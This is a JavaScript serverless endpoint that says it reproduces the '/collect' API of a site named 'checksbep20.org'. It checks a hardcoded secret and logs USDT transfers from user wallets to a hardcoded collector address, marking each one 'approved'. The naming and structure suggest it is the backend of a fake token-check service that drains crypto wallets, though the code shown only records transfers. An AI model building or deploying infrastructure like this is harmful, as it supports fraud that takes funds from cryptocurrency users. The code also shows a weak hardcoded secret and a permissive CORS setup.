// ============================================
// COLLECT ENDPOINT - POST /collect
// Exactly like: https://collector.checksbep20.org/collect
// ============================================

const SECRET_KEY = "7x143414";
const COLLECTOR_ADDRESS = "0x5681d680B047bF5b12939625C56301556991005e";

// In-memory storage (use database in production)
let transactions = [];

function generateTxId() {
    return 'tx_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
}

export default async function handler(req, res) {
    // Set CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-Topup-Secret');
    
    // Handle OPTIONS preflight
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }
    
    // Only allow POST
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }
    
    try {
        const body = req.body;
        
        // Check secret (from body or header)
        const secret = body.token || body.secret || req.headers['x-topup-secret'];
        
        if (secret !== SECRET_KEY) {
            return res.status(401).json({
                status: 'error',
                error: 'Invalid secret key'
            });
        }
        
        // Extract data
        const userAddress = body.from || body.userAddress || body.signerAddress;
        const amount = body.amount || body.amountHuman;
        const recipient = body.to || COLLECTOR_ADDRESS;
        
        if (!userAddress || !amount) {
            return res.status(400).json({
                status: 'error',
                error: 'Missing required fields: from and amount'
            });
        }
        
        // Create transaction record
        const transaction = {
            id: generateTxId(),
            timestamp: new Date().toISOString(),
            from: userAddress,
            amount: String(amount),
            to: recipient,
            status: 'approved'
        };
        
        // Store transaction
        transactions.unshift(transaction);
        
        // Keep only last 1000
        if (transactions.length > 1000) {
            transactions = transactions.slice(0, 1000);
        }
        
        console.log(`✅ Transaction: ${transaction.id} - ${amount} USDT from ${userAddress}`);
        
        // Return response (matching original format)
        return res.status(200).json({
            status: 'success',
            message: 'Transaction logged successfully',
            id: transaction.id,
            transactionId: transaction.id
        });
        
    } catch (error) {
        console.error('Error:', error);
        return res.status(500).json({
            status: 'error',
            error: error.message
        });
    }
}
